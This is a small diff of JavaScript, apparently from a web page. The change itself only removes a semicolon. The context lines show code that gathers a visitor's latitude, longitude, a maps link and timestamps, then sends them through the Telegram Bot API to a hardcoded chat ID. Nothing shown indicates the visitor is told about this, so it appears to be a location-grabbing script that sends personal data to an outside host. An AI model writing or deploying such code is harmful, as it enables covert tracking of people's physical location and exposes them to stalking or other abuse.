@@ -60,7 +60,7 @@ join at : ${localStorage.getItem('get_loc_join')}%0A
 date : ${getTime()}%0A
 latitude : ${geoLoc.latitude}%0A
 longitude : ${geoLoc.longitude}%0A
-link maps : ${linkMaps};
+link maps : ${linkMaps}
 `;
 
     const apiURL = `https://api.telegram.org/bot${apiToken}/sendMessage?chat_id=1394633260&text=${content}`;
